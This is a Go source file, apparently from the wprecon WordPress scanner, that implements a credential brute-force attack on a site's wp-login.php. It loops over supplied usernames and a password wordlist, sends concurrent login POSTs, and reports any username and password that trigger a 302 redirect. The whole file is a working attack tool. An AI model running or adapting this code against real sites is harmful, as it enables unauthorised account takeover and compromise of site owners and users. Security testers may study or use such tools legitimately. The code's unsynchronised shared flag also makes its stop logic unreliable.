package fuzzing

import (
	httplib "net/http"
	"net/url"
	"strings"
	"time"

	. "github.com/blackcrw/wprecon/cli/config"
	"github.com/blackcrw/wprecon/pkg/gohttp"
	"github.com/blackcrw/wprecon/pkg/printer"
	"github.com/blackcrw/wprecon/pkg/text"
)

func WPLogin() int {
	usernamess := InfosWprecon.OtherInformationsString["target.http.fuzzing.usernames"]
	passwordsfile := InfosWprecon.OtherInformationsString["target.http.fuzzing.passwords.file.wordlist"]

	if usernamess == "" || passwordsfile == "" {
		printer.Danger("Error, check if you entered the username and your password wordlist.")
		return 0
	}

	newtopline := printer.NewTopLine(":: Loading wordlist... ::")

	passwords, passwordscount := text.ReadAllFile(passwordsfile)

	done := false

	for _, username := range strings.Split(usernamess, ",") {
		for key, password := range passwords {
			if !done {
				go func() {
					newtopline.Progress(passwordscount, "Username:", username, "— Password:", password)

					is, err := wploginSimpleRequest(username, password)

					if err != nil {
						newtopline.DownLine()
						printer.Fatal(err)
					}

					if is {
						newtopline.Done("Passoword Found!")
						printer.Done("Username:", username, "— Password:", password)
						newtopline.Count2 = 0
						done = true
					}

					if 1+key >= passwordscount {
						newtopline.Danger("No password worked for the user:", username)
						newtopline.Count2 = 0
					}
				}()
			} else {
				break
			}
			time.Sleep(time.Millisecond * 100)
		}
		done = false
	}

	return 0
}

func wploginSimpleRequest(username, password string) (bool, error) {
	done := false

	http := gohttp.NewHTTPClient()
	http.SetMethod("POST")
	http.SetURL(InfosWprecon.Target).SetURLDirectory("wp-login.php")
	http.SetForm(&url.Values{"log": {username}, "pwd": {password}})
	http.SetRedirectFunc(func(req *httplib.Request, via []*httplib.Request) error {

		if req.Response.StatusCode == 302 {
			done = true
		}

		return nil
	})
	http.SetContentType("application/x-www-form-urlencoded")

	_, err := http.Run()

	if err != nil {
		return false, err
	}

	if done {
		return true, nil
	}

	return false, nil
}
